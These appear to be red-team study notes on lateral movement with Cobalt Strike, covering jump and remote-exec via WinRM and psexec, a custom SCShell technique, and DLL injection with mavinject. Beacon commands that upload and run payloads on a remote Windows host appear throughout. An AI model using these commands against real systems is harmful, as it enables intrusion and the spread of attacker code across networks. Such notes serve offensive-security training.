tactic where an adversary attempts to gain access to other copmuters on the network
cobalt stike provides two base commands for executing such commands:
  jump: automates all the steps (upload payload, execute, connecting to new beacon, deleting payload)
        syntax: jump <exploit> <target> <listener> 
        NOTE: running 'jump' will list all exploits (techniques) 
  remote-exec: broader capability for executing remote commands
        syntax: remote-exec <method> <target> <command>
        NOTE: running 'remote-exec' will list all methods (psexec, winrm, wmi)

windows remote management (WinRM):
  allows for remote management of copmuters via PowerShell and executes payload entirely in memory
  e.g. beacon> jump winrm64 lon-ws-1 smb
  e.g. beacon> remote-exec winrm lon-ws-1 net sessions
    NOTE: WinRM is the only remote-exec method that returns output!

psexec:
  allows for process execution via the service control manager
  e.g. beacon> jump psexec64 lon-ws-1 smb
  NOTE: these will always run as SYSTEM, it is also the loudest of the laternal movement techniques as it prompts new service creation

custom techniques:
  we can extend these commands to include custom scripts, DLLs, etc.
  this project, https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF, varies from psexec by modifying an exisiting service instead of creating a new one
    we can use these by uploading them via Cobalt Strike > Script Manager
    e.g. beacon> jump scshell64 lon-ws-1 smb

LOLBAS (living of the land binaries and scripts):
  using scripts, libraries, or binaries native to Windows or that can be downloaded from Microsoft
  e.g. MavInject allows us to inject libraries into other processes, living in System32/SysWOW64
         mavinject.exe <PID> /INJECTRUNNING <DLL PATH>
       we can use remote-exec to list processes running:
        beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
       then we can upload our DLL and use MavInject to inject:
        beacon> cd \\lon-ws-1\ADMIN$\System32
        beacon> upload C:\Payloads\smb_x64.dll
        beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll

security logon types:
  once we have successfully moved laterally, we may notice that errors are thrown during enumeration attempts
  this is likely due to the Network logon type, used by WinRM and psexec, which does not leave creds in LSASS
  the solution to this is to populate the beacon session with credentials (make_token, ptt), only if necessary!
